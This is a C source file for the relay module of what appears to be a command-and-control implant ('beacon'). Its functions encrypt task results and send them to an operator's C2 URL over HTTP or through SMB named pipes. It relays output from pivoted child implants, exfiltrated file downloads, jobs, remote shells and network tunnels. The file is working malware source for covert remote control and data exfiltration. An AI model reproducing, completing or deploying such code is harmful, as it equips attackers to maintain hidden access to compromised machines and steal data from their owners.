/* beacon/src/Transport/Relay.c
 * Unified relay engine for all five subsystems (pivots, downloads, jobs,
 * shells, tunnels).  NaxSendResult + NaxRelayAll replace per-transport
 * HttpRelay and SmbRelay duplicates with a single compile-time-gated module.
 *
 * Build: included in both HTTP and SMB variants via Makefile. */

#include "Nax.h"
#include "Transport.h"
#include "Pipe.h"

/* ========= [ NaxSendResult ] ========= */

#if NAX_TRANSPORT_PROFILE == NAX_TRANSPORT_HTTP

FUNC BOOL NaxSendResult( PNAX_INSTANCE Nax, UINT32 tid, BYTE status, const PBYTE data, UINT32 data_len, PBYTE frame, UINT32 frame_cap, PBYTE env, UINT32 env_cap, PWCHAR c2_url, PBYTE resp, UINT32 resp_cap ) {
    UINT32 frame_len = frame_cap;
    if ( NaxBuildResult( tid, status, data, data_len, frame, &frame_len ) != NAX_OK ) return FALSE;
    UINT32 env_len = env_cap;
    if ( NaxEncrypt( Nax, frame, frame_len, env, &env_len ) != NAX_OK ) return FALSE;
    UINT32 resp_len = resp_cap;
    return ( NaxSend( Nax, c2_url, Nax->SessionId, env, env_len, resp, &resp_len ) == NAX_OK );
}

#elif NAX_TRANSPORT_PROFILE == NAX_TRANSPORT_SMB

FUNC BOOL NaxSendResult( PNAX_INSTANCE Nax, UINT32 tid, BYTE status, const PBYTE data, UINT32 data_len, PBYTE frame, UINT32 frame_cap, PBYTE env, UINT32 env_cap, HANDLE hPipe, HANDLE hWriteEvent ) {
    UINT32 frame_len = frame_cap;
    if ( NaxBuildResult( tid, status, data, data_len, frame, &frame_len ) != NAX_OK ) return FALSE;
    UINT32 env_len = env_cap;
    if ( NaxEncrypt( Nax, frame, frame_len, env, &env_len ) != NAX_OK ) return FALSE;
    return NaxPipeWrite( Nax, hPipe, hWriteEvent, env, env_len );
}

#endif

/* ========= [ NaxRelayAll ] ========= */

FUNC BOOL NaxRelayAll( PNAX_INSTANCE Nax, PBYTE result, UINT32 result_cap, PBYTE frame, UINT32 frame_cap, PBYTE env, UINT32 env_cap, NAX_RELAY_CTX* ctx ) {

    /* ---- pivots ---- */
    if ( Nax->PivotHead ) {
        UINT32 piv_len = NaxProcessPivots( Nax, result, result_cap );
        PBYTE  piv_cur = result;
        UINT32 piv_rem = piv_len;
        while ( piv_rem >= 4 ) {
            UINT32 entryLen = *(UINT32*)piv_cur;
            if ( entryLen == 0 || 4 + entryLen > piv_rem ) break;
#if NAX_TRANSPORT_PROFILE == NAX_TRANSPORT_HTTP
            if ( ! NaxSendResult( Nax, 0, NAX_STATUS_OK, piv_cur + 4, entryLen, frame, frame_cap, env, env_cap, ctx->C2Url, ctx->Resp, ctx->RespCap ) )
                return FALSE;
#elif NAX_TRANSPORT_PROFILE == NAX_TRANSPORT_SMB
            if ( ! NaxSendResult( Nax, 0, NAX_STATUS_OK, piv_cur + 4, entryLen, frame, frame_cap, env, env_cap, ctx->hPipe, ctx->hWriteEvent ) )
                return FALSE;
#endif
            piv_cur += 4 + entryLen;
            piv_rem -= 4 + entryLen;
        }
        if ( piv_len > 0 ) {
            NaxDbg( Nax, "[pivot] relayed %u bytes of child data", piv_len );
#if NAX_TRANSPORT_PROFILE == NAX_TRANSPORT_SMB
            ctx->DataRelayed = TRUE;
#endif
        }
    }

    /* ---- downloads ---- */
    if ( Nax->DownloadHead ) {
        UINT32 dl_len = NaxProcessDownloads( Nax, result, result_cap );
        UINT32 doff = 0;
        while ( doff + 8 <= dl_len ) {
            UINT32 tid  = NaxR32( result + doff );
            UINT32 dlen = NaxR32( result + doff + 4 );
            if ( doff + 8 + dlen > dl_len ) break;
#if NAX_TRANSPORT_PROFILE == NAX_TRANSPORT_HTTP
            if ( ! NaxSendResult( Nax, tid, NAX_STATUS_OK, result + doff + 8, dlen, frame, frame_cap, env, env_cap, ctx->C2Url, ctx->Resp, ctx->RespCap ) )
                return FALSE;
#elif NAX_TRANSPORT_PROFILE == NAX_TRANSPORT_SMB
            if ( ! NaxSendResult( Nax, tid, NAX_STATUS_OK, result + doff + 8, dlen, frame, frame_cap, env, env_cap, ctx->hPipe, ctx->hWriteEvent ) )
                return FALSE;
#endif
            doff += 8 + dlen;
        }
    }

    /* ---- jobs ---- */
    if ( Nax->JobHead ) {
        UINT32 job_len = NaxProcessJobs( Nax, result, result_cap );
        UINT32 joff = 0;
        while ( joff + 9 <= job_len ) {
            BYTE   jtype = result[ joff ];
            UINT32 jtid  = NaxR32( result + joff + 1 );
            UINT32 jdata = NaxR32( result + joff + 5 );
            if ( joff + 9 + jdata > job_len ) break;
#if NAX_TRANSPORT_PROFILE == NAX_TRANSPORT_HTTP
            if ( ! NaxSendResult( Nax, jtid, jtype, result + joff + 9, jdata, frame, frame_cap, env, env_cap, ctx->C2Url, ctx->Resp, ctx->RespCap ) )
                return FALSE;
#elif NAX_TRANSPORT_PROFILE == NAX_TRANSPORT_SMB
            if ( ! NaxSendResult( Nax, jtid, jtype, result + joff + 9, jdata, frame, frame_cap, env, env_cap, ctx->hPipe, ctx->hWriteEvent ) )
                return FALSE;
#endif
            joff += 9 + jdata;
        }
    }

    /* ---- shells ---- */
    if ( Nax->ShellHead ) {
        UINT32 sh_len = NaxProcessShells( Nax, result, result_cap );
        UINT32 soff = 0;
        while ( soff + 9 <= sh_len ) {
            BYTE   stype = result[ soff ];
            UINT32 stid  = NaxR32( result + soff + 1 );
            UINT32 sdata = NaxR32( result + soff + 5 );
            if ( soff + 9 + sdata > sh_len ) break;
#if NAX_TRANSPORT_PROFILE == NAX_TRANSPORT_HTTP
            if ( ! NaxSendResult( Nax, stid, stype, result + soff + 9, sdata, frame, frame_cap, env, env_cap, ctx->C2Url, ctx->Resp, ctx->RespCap ) )
                return FALSE;
#elif NAX_TRANSPORT_PROFILE == NAX_TRANSPORT_SMB
            if ( ! NaxSendResult( Nax, stid, stype, result + soff + 9, sdata, frame, frame_cap, env, env_cap, ctx->hPipe, ctx->hWriteEvent ) )
                return FALSE;
#endif
            soff += 9 + sdata;
        }
    }

    /* ---- tunnels ---- */
    if ( Nax->TunnelHead ) {
        UINT32 tun_len = NaxProcessTunnels( Nax, result, result_cap );
        if ( tun_len > 0 ) {
#if NAX_TRANSPORT_PROFILE == NAX_TRANSPORT_HTTP
            if ( ! NaxSendResult( Nax, 0, NAX_STATUS_TUNNEL, result, tun_len, frame, frame_cap, env, env_cap, ctx->C2Url, ctx->Resp, ctx->RespCap ) )
                return FALSE;
#elif NAX_TRANSPORT_PROFILE == NAX_TRANSPORT_SMB
            if ( ! NaxSendResult( Nax, 0, NAX_STATUS_TUNNEL, result, tun_len, frame, frame_cap, env, env_cap, ctx->hPipe, ctx->hWriteEvent ) )
                return FALSE;
            ctx->TunnelRelayed = TRUE;
#endif
        }
    }

    return TRUE;
}
